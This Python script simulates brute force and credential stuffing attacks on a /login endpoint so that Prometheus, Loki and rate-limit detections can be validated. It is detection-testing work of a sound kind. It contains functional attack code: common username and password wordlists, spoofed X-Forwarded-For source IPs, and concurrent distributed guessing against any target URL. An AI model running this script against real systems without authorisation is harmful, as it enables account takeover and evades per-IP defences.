#!/usr/bin/env python3
"""
=============================================================================
Attack Simulation: Brute Force Login
=============================================================================
Simulates a credential stuffing / brute force attack against the /login
endpoint. Used to validate:

  1. Prometheus "ExcessiveFailedLogins" alert fires within 2 minutes
  2. Alertmanager routes alert to #security-incidents Slack channel
  3. Loki "BruteForceInLogs" rule triggers from log ingestion
  4. Application-level rate limiting (429) kicks in after 5 failures
  5. Falco does NOT alert (no syscall anomaly — purely HTTP-layer attack)

Detection expected: Prometheus + Loki (NOT Falco — no container exec)
MITRE ATT&CK: T1110 — Brute Force / T1110.004 — Credential Stuffing

Usage:
    python3 attacks/brute_force.py --target http://localhost:8080 --rate 5
    python3 attacks/brute_force.py --target http://threat-detection-app --mode distributed
=============================================================================
"""

import argparse
import json
import logging
import random
import sys
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, field
from datetime import datetime, timezone

import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s %(levelname)s %(message)s',
    datefmt='%Y-%m-%dT%H:%M:%SZ'
)
logger = logging.getLogger("brute-force-simulator")


# =============================================================================
# Configuration
# =============================================================================

# Wordlists for credential stuffing simulation
# WHY: Real brute force attacks use realistic credential dictionaries.
# These are generic enough to be safe in a demo context.
USERNAMES = [
    "admin", "administrator", "root", "user", "test",
    "monitor", "operator", "deploy", "service", "guest",
    "jenkins", "gitlab", "postgres", "mysql", "redis"
]

PASSWORDS = [
    "password", "123456", "password123", "admin123", "letmein",
    "welcome", "qwerty", "abc123", "Password1", "Pass@word",
    "changeme", "default", "admin", "login", "test123",
    "welcome1", "monkey", "dragon", "master", "sunshine"
]

# Source IPs to simulate distributed attack
SIMULATED_SOURCE_IPS = [
    "203.0.113.10",   # TEST-NET-3 (RFC 5737 — safe for documentation)
    "203.0.113.20",
    "203.0.113.30",
    "198.51.100.10",  # TEST-NET-2
    "198.51.100.20",
    "198.51.100.30",
]


@dataclass
class AttackResult:
    """Tracks results for post-attack analysis."""
    total_requests: int = 0
    successful_logins: int = 0
    failed_logins: int = 0
    rate_limited: int = 0
    errors: int = 0
    start_time: float = field(default_factory=time.time)
    results: list[dict] = field(default_factory=list)

    def summary(self) -> dict:
        elapsed = time.time() - self.start_time
        return {
            "total_requests": self.total_requests,
            "successful_logins": self.successful_logins,
            "failed_logins": self.failed_logins,
            "rate_limited_responses": self.rate_limited,
            "errors": self.errors,
            "duration_seconds": round(elapsed, 2),
            "requests_per_second": round(self.total_requests / elapsed, 2) if elapsed > 0 else 0,
        }


def create_session(source_ip: str | None = None) -> requests.Session:
    """Create HTTP session with retry configuration."""
    session = requests.Session()
    retry_strategy = Retry(
        total=3,
        backoff_factor=0.1,
        status_forcelist=[500, 502, 503, 504],
    )
    adapter = HTTPAdapter(max_retries=retry_strategy)
    session.mount("http://", adapter)
    session.mount("https://", adapter)

    if source_ip:
        session.headers.update({"X-Forwarded-For": source_ip})

    return session


def attempt_login(
    target: str,
    username: str,
    password: str,
    source_ip: str | None = None,
    result_tracker: AttackResult | None = None,
) -> dict:
    """
    Sends a single login request and records the result.

    Returns a dict with: username, password_attempted, status_code, response_ms
    """
    session = create_session(source_ip)
    start = time.time()

    try:
        response = session.post(
            f"{target}/login",
            json={"username": username, "password": password},
            timeout=10,
            headers={
                "Content-Type": "application/json",
                "User-Agent": "Mozilla/5.0 (compatible; BruteForceSimulator/1.0)"
            }
        )
        elapsed_ms = round((time.time() - start) * 1000, 1)

        result = {
            "username": username,
            "password_attempted": password[:3] + "***",  # Partial masking for logs
            "source_ip": source_ip,
            "status_code": response.status_code,
            "response_ms": elapsed_ms,
            "timestamp": datetime.now(timezone.utc).isoformat()
        }

        if result_tracker:
            result_tracker.total_requests += 1
            if response.status_code == 200:
                result_tracker.successful_logins += 1
                logger.warning(f"SUCCESS: user={username} source_ip={source_ip}")
            elif response.status_code == 429:
                result_tracker.rate_limited += 1
                logger.info(f"RATE_LIMITED: user={username} source_ip={source_ip}")
            else:
                result_tracker.failed_logins += 1

        logger.debug(
            f"LOGIN_ATTEMPT user={username} src={source_ip} "
            f"status={response.status_code} elapsed={elapsed_ms}ms"
        )
        return result

    except requests.exceptions.RequestException as e:
        elapsed_ms = round((time.time() - start) * 1000, 1)
        if result_tracker:
            result_tracker.total_requests += 1
            result_tracker.errors += 1
        logger.error(f"REQUEST_ERROR user={username} error={str(e)}")
        return {"username": username, "error": str(e), "elapsed_ms": elapsed_ms}


def run_sequential_attack(
    target: str,
    username: str,
    count: int,
    rate: float,
    result_tracker: AttackResult
) -> None:
    """
    Sequential brute force — single source IP against single account.
    This is the pattern detected by Prometheus per-IP metric threshold.
    """
    source_ip = SIMULATED_SOURCE_IPS[0]
    logger.info(
        f"[SEQUENTIAL] Starting brute force: target={username} "
        f"attempts={count} rate={rate}/s source_ip={source_ip}"
    )

    for i, password in enumerate(PASSWORDS[:count]):
        result = attempt_login(target, username, password, source_ip, result_tracker)
        result_tracker.results.append(result)

        status = result.get("status_code", "ERR")
        logger.info(
            f"  [{i+1}/{count}] user={username} pw={password[:3]}*** "
            f"status={status} ip={source_ip}"
        )

        # Stop if rate limited — target detection has been triggered
        if result.get("status_code") == 429:
            logger.warning(
                f"[SEQUENTIAL] Rate limit hit after {i+1} attempts — "
                f"Prometheus alert should be firing now"
            )
            break

        # Throttle to requested rate
        if rate > 0:
            time.sleep(1.0 / rate)


def run_distributed_attack(
    target: str,
    total_attempts: int,
    concurrency: int,
    result_tracker: AttackResult
) -> None:
    """
    Distributed brute force — multiple source IPs, multiple usernames.
    WHY: Tests detection systems that track global failure rate, not per-IP.
    Loki "BruteForceInLogs" alert detects this pattern (total count, not per-IP).
    """
    logger.info(
        f"[DISTRIBUTED] Starting distributed credential stuffing: "
        f"attempts={total_attempts} concurrency={concurrency} "
        f"source_ips={len(SIMULATED_SOURCE_IPS)}"
    )

    # Generate attack combinations
    combinations = [
        (random.choice(USERNAMES), random.choice(PASSWORDS), random.choice(SIMULATED_SOURCE_IPS))
        for _ in range(total_attempts)
    ]

    with ThreadPoolExecutor(max_workers=concurrency) as executor:
        futures = {
            executor.submit(
                attempt_login, target, username, password, source_ip, result_tracker
            ): (username, source_ip)
            for username, password, source_ip in combinations
        }

        for future in as_completed(futures):
            username, source_ip = futures[future]
            try:
                result = future.result()
                result_tracker.results.append(result)
            except Exception as e:
                logger.error(f"Future error: {e}")


def run_targeted_account_attack(
    target: str,
    username: str,
    rate_tracker: AttackResult
) -> None:
    """
    Exhaustive password spray against a single account.
    Tests account lockout and per-user rate limiting.
    """
    logger.info(
        f"[TARGETED] Exhaustive spray against user={username} "
        f"passwords={len(PASSWORDS)}"
    )

    source_ip = "198.51.100.50"
    for i, password in enumerate(PASSWORDS):
        result = attempt_login(target, username, password, source_ip, rate_tracker)
        rate_tracker.results.append(result)
        status = result.get("status_code", "ERR")
        logger.info(f"  [{i+1}/{len(PASSWORDS)}] {password[:4]}*** → HTTP {status}")

        if result.get("status_code") == 429:
            logger.warning(f"[TARGETED] Account locked after {i+1} attempts")
            break

        time.sleep(0.2)  # 5 attempts/second


def main():
    parser = argparse.ArgumentParser(
        description="Brute Force Login Simulation — Threat Detection Platform"
    )
    parser.add_argument(
        "--target",
        default="http://localhost:8080",
        help="Base URL of the target application"
    )
    parser.add_argument(
        "--mode",
        choices=["sequential", "distributed", "targeted"],
        default="sequential",
        help=(
            "sequential: single IP rapid attempts (tests per-IP threshold)\n"
            "distributed: multiple IPs (tests global threshold)\n"
            "targeted: exhaustive spray against one account"
        )
    )
    parser.add_argument(
        "--username",
        default="admin",
        help="Target username (for sequential/targeted modes)"
    )
    parser.add_argument(
        "--count",
        type=int,
        default=20,
        help="Number of login attempts (sequential mode)"
    )
    parser.add_argument(
        "--rate",
        type=float,
        default=5.0,
        help="Attempts per second (sequential mode)"
    )
    parser.add_argument(
        "--concurrency",
        type=int,
        default=4,
        help="Concurrent threads (distributed mode)"
    )
    parser.add_argument(
        "--output",
        help="Write results JSON to file"
    )
    parser.add_argument(
        "--dry-run",
        action="store_true",
        help="Show configuration without executing attack"
    )
    args = parser.parse_args()

    print("=" * 70)
    print("  BRUTE FORCE ATTACK SIMULATION")
    print("  Cloud-Native Threat Detection Platform")
    print("=" * 70)
    print(f"  Target:    {args.target}")
    print(f"  Mode:      {args.mode}")
    print(f"  Username:  {args.username}")
    print()
    print("  DETECTION EXPECTED:")
    print("  [x] Prometheus: ExcessiveFailedLogins (fires at >10/2min)")
    print("  [x] Loki: BruteForceInLogs (fires at >20/1min globally)")
    print("  [ ] Falco: NOT expected (no container exec)")
    print("=" * 70)

    if args.dry_run:
        print("\n[DRY RUN] Configuration shown above. No requests sent.")
        return 0

    # Wait for user acknowledgment
    input("\nPress ENTER to start attack simulation (Ctrl+C to cancel)...")

    tracker = AttackResult()
    start = datetime.now(timezone.utc)

    try:
        if args.mode == "sequential":
            run_sequential_attack(
                args.target, args.username, args.count, args.rate, tracker
            )
        elif args.mode == "distributed":
            run_distributed_attack(
                args.target, args.count, args.concurrency, tracker
            )
        elif args.mode == "targeted":
            run_targeted_account_attack(args.target, args.username, tracker)

    except KeyboardInterrupt:
        logger.info("Attack simulation interrupted by user")

    # Print summary
    summary = tracker.summary()
    print("\n" + "=" * 70)
    print("  ATTACK SIMULATION COMPLETE")
    print("=" * 70)
    for key, value in summary.items():
        print(f"  {key:30s}: {value}")
    print()
    print("  VERIFY DETECTION:")
    print("  Prometheus:  http://localhost:9090/alerts")
    print("  Alertmanager: http://localhost:9093")
    print("  Loki (Grafana): http://localhost:3000")
    print('  Query: {app="threat-detection-app"} |= "AUTHENTICATION_FAILURE"')
    print("=" * 70)

    if args.output:
        with open(args.output, 'w') as f:
            json.dump({
                "attack_config": vars(args),
                "start_time": start.isoformat(),
                "summary": summary,
                "results": tracker.results
            }, f, indent=2)
        logger.info(f"Results written to {args.output}")

    return 0


if __name__ == "__main__":
    sys.exit(main())
